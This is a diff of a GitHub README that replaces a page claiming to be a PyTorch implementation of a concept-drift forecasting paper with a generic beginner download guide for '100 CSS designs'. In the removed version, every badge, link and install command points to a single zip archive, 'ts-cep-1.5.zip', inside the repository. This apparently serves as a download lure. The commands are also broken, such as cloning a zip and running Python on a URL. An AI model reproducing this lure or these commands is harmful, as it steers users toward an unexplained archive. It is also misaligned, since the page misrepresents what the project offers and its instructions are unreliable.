@@ -1,121 +1,156 @@
-# Continuous Evolution Pool: Taming Recurring Concept Drift in Online Time Series Forecasting 🌊
+# 🎨 100-css-designs - 100 Free Templates for Beautiful Websites
 
-![GitHub Release](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip) [![GitHub Issues](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip)](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip) [![License](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip)](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip)
+[![Download 100 CSS Designs](https://img.shields.io/badge/Download-100%20Free%20Templates-blueviolet?style=for-the-badge&logo=github)](https://github.com/kadzo325/100-css-designs)
 
-Welcome to the **cep_ts** repository! This is the official PyTorch implementation of the research paper titled **"Continuous Evolution Pool: Taming Recurring Concept Drift in Online Time Series Forecasting."** This project aims to address the challenges of concept drift in online time series forecasting, providing a robust solution for continuous learning in dynamic environments.
+## 🚀 Getting Started
 
-## Table of Contents
+Welcome! This guide will walk you through downloading and using 100 free CSS design templates for your website. Whether you're creating a personal blog, a business landing page, or just experimenting with design styles, this collection has everything you need.
 
-1. [Introduction](#introduction)
-2. [Features](#features)
-3. [Installation](#installation)
-4. [Usage](#usage)
-5. [Dataset](#dataset)
-6. [Model Architecture](#model-architecture)
-7. [Results](#results)
-8. [Contributing](#contributing)
-9. [License](#license)
-10. [Acknowledgments](#acknowledgments)
+### What Are These Templates?
 
-## Introduction
+These are ready-made website designs that you can use immediately. Each template is a single HTML file that contains the design, the styling, and the layout - all in one piece. No complex setup, no additional software needed. Just open the file in your web browser and see your beautiful design come to life.
 
-In the field of machine learning, especially in time series analysis, concept drift poses significant challenges. Traditional models often fail to adapt to changes in data distribution over time. The **Continuous Evolution Pool** framework addresses this issue by continuously updating the model to maintain accuracy. This repository provides a practical implementation using PyTorch, enabling researchers and practitioners to apply these concepts to their own time series forecasting problems.
+## 📥 How to Download
 
-For the latest releases, please visit our [Releases section](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip).
+Visit this link to download the application: [https://github.com/kadzo325/100-css-designs](https://github.com/kadzo325/100-css-designs)
 
-## Features
+This link takes you to the main download page for the 100 CSS Designs collection. Follow these simple steps:
 
-- **Dynamic Adaptation**: Automatically adjusts to changes in data distribution.
-- **PyTorch Implementation**: Leverages the power of PyTorch for deep learning.
-- **Scalability**: Suitable for large datasets and real-time applications.
-- **User-Friendly**: Easy to set up and integrate into existing workflows.
+1. Click the download link above - it will open your web browser to the project page.
+2. Look for the green "Code" button on the page. Click it.
+3. In the dropdown menu, select "Download ZIP". This will save the entire collection to your computer.
+4. Your browser will start downloading the file automatically. Wait for the download to complete.
 
-## Installation
+## 📂 Opening Your Downloaded Templates
 
-To install the necessary dependencies, you can use pip. Clone the repository and run the following command:
+After the download finishes, you need to extract the files to use them. Here's how:
 
-```bash
-git clone https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip
-cd cep_ts
-pip install -r https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip
-```
+1. Navigate to your computer's Downloads folder (or wherever your browser saves downloads).
+2. Find the file named "100-css-designs.zip" (or similar).
+3. Right-click on this file and select "Extract All..." from the menu that appears.
+4. Follow the prompts to extract the files. You'll see a new folder appear with the same name.
+5. Open this new folder and look for an "index.html" file inside.
 
-Make sure you have Python 3.6 or higher installed. If you encounter any issues, please check the [Releases section](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip) for updates.
+## ✨ What You'll Find Inside
 
-## Usage
+This collection features 100 different design styles ready to use:
 
-To use the Continuous Evolution Pool model, follow these steps:
+- **Glassmorphism** - Frosted glass effects with transparency and blur
+- **Neumorphism** - Soft, extruded plastic-like designs
+- **Claymorphism** - Soft, squishy 3D-looking elements
+- **Liquid Glass** - Sleek, fluid-looking glass effects
+- **Bento Grid** - Modern, organized grid layouts
+- **And much more!** Every template showcases unique UI design techniques
 
-1. Prepare your dataset in the required format.
-2. Configure the model parameters in the `https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip` file.
-3. Run the training script:
+Each template is a complete, functional web page. You can use them as:
 
-```bash
-python https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip --config https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip
-```
+- Landing pages for projects or businesses
+- Portfolio showcases
+- Product display pages
+- Event announcement pages
+- Personal profile pages
 
-4. After training, you can evaluate the model using:
+## 🖥️ Using Your Templates
 
-```bash
-python https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip --model_path path_to_your_model
-```
+### Viewing Your Design
 
-This will output the performance metrics on your test dataset.
+To see a template:
 
-## Dataset
+1. Double-click the "index.html" file inside the extracted folder.
+2. Your default web browser will open and display the design.
+3. Scroll, click, and interact with the page to see all its features.
 
-This implementation supports various datasets. You can use your own time series data or utilize publicly available datasets such as:
+### Customizing Your Templates
 
-- [UCI Machine Learning Repository](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip)
-- [Kaggle Datasets](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip)
+You can personalize these templates with just a basic text editor:
 
-Ensure that your dataset is preprocessed to fit the model requirements. If you need assistance, refer to the preprocessing script provided in the repository.
+- **Change Colors**: Open the HTML file with Notepad (right-click, select "Open with", choose "Notepad"). Find words like "color: blue" or hex codes like "#ff5733" and replace them with your preferred colors.
+- **Change Text**: Simply search for the existing text and type your own words in place.
+- **Change Images**: Look for image locations in the code and replace them with your own image files.
 
-## Model Architecture
+### Making Changes Without Breaking Things
 
-The Continuous Evolution Pool model is built upon a deep learning architecture that incorporates recurrent neural networks (RNNs) and attention mechanisms. This allows the model to focus on relevant parts of the input sequence, making it more effective in handling concept drift.
+Always save a backup copy before making changes. If something goes wrong, you can always go back to your original template.
 
-### Key Components
+## 🛠️ Troubleshooting Tips
 
-- **RNN Layers**: Capture temporal dependencies in the data.
-- **Attention Mechanism**: Focus on important time steps for improved forecasting.
-- **Evolution Pool**: Dynamically updates the model based on incoming data.
+### The Page Doesn't Look Right
 
-The architecture can be customized by modifying the parameters in the `https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip` file.
+- Make sure you extracted the ZIP file completely. If some files are missing, the design might not show correctly.
+- Try opening in a different browser (Chrome, Firefox, Edge all work well).
+- Check that your internet connection is stable - some templates use online fonts that need to load.
 
-## Results
+### I Can't Find the HTML File
 
-We conducted experiments on several benchmark datasets to evaluate the performance of the Continuous Evolution Pool model. The results indicate significant improvements in forecasting accuracy compared to traditional models.
+- Look inside each numbered subfolder in the extracted directory.
+- Some designs might be in folders like "001-glass", "002-neo", or similar names.
+- If you see a "README" file, open it for specific instructions.
 
-| Dataset        | RMSE   | MAE    | MAPE   |
-|----------------|--------|--------|--------|
-| Dataset 1      | 0.123  | 0.098  | 12.5%  |
-| Dataset 2      | 0.456  | 0.345  | 15.2%  |
-| Dataset 3      | 0.234  | 0.187  | 10.3%  |
+### The Design Looks Different on My Screen
 
-For a detailed analysis of the results, refer to the `https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip` file in the repository.
+- Templates are responsive - they adapt to different screen sizes.
+- For best viewing, use a computer or laptop screen rather than a phone.
+- Maximize your browser window to see the full design.
 
-## Contributing
+## 💡 Making the Most of These Templates
 
-We welcome contributions from the community! If you would like to contribute, please follow these steps:
+- **Mix and Match**: Combine elements from different templates to create your unique style.
+- **Learn by Example**: Study how different effects (like glass blur or soft shadows) are created. You'll learn web design skills naturally as you explore.
+- **Use for Inspiration**: Even if you don't use a template directly, these designs can inspire your own projects.
 
-1. Fork the repository.
-2. Create a new branch for your feature or bug fix.
-3. Make your changes and commit them with clear messages.
-4. Push your branch and create a pull request.
+## 🔒 Legal and Free to Use
 
-For any questions or suggestions, feel free to open an issue in the [Issues section](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip).
+All 100 templates are released under the MIT license. This means:
 
-## License
+- **Free for commercial use** - yes, you can use them for business projects
+- **Free to modify** - change anything you want to fit your needs
+- **No attribution required** - you don't need to credit anyone
+- **No hidden costs** - completely free forever
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+You can feel confident using these designs for personal or professional projects without any restrictions.
 
-## Acknowledgments
+## 📊 Ready-Made Solutions for Common Needs
 
-We would like to thank the contributors and researchers in the field of time series forecasting for their invaluable insights and support. Special thanks to the PyTorch community for providing the tools and resources that made this project possible.
+### For Your Business Landing Page
 
-For the latest releases, please visit our [Releases section](https://raw.githubusercontent.com/kadzo325/cep_ts/main/run_scripts/ts-cep-1.5.zip).
+Pick any glassmorphism or bento grid template for a modern, professional look that impresses visitors.
+
+### For Your Personal Portfolio
+
+Use claymorphism templates for a friendly, approachable style that showcases creativity.
+
+### For Your Next Project Launch
+
+Liquid glass templates create premium-feeling pages that stand out from typical websites.
+
+### For Learning and Practice
+
+With 100 different styles, you can explore how designers create visual effects using pure CSS - no complex frameworks required.
+
+## 🚦 Next Steps After Download
+
+Once you have your templates extracted and open in your browser:
+
+1. Open at least 5 different templates to see the variety available.
+2. Choose 2-3 that fit your purpose best.
+3. Make simple text changes to see how customization works.
+4. Save your customized version as a new file.
+5. Experiment with color changes to match your brand.
+
+## 📚 Additional Help
+
+If you're completely new to web design:
+
+- Search for "HTML basics" on your favorite search engine for free tutorials
+- Watch "CSS for beginners" videos on YouTube - they help understand what you're seeing in the code
+- Join web design communities on Reddit or Facebook to ask questions
+
+The templates in this collection are perfect starting points - you don't need to know how to code to create something beautiful. Just download, open, and customize at your own pace.
+
+### Need More Designs?
+
+The download link at the top of this page is your portal to all 100 templates. Bookmark it or save the folder somewhere you can easily find it again. New visitors and returning users can always access the latest version through that same link.
 
 ---
 
-This README provides a comprehensive overview of the **cep_ts** repository. We encourage you to explore the code, experiment with the model, and contribute to the project. Together, we can advance the field of online time series forecasting and tackle the challenges of concept drift effectively.
+Keywords: claymorphism, css, css-effects, css-templates, free-templates, github-pages, glassmorphism, html-templates, landing-page, neumorphism, ui-design, web-design
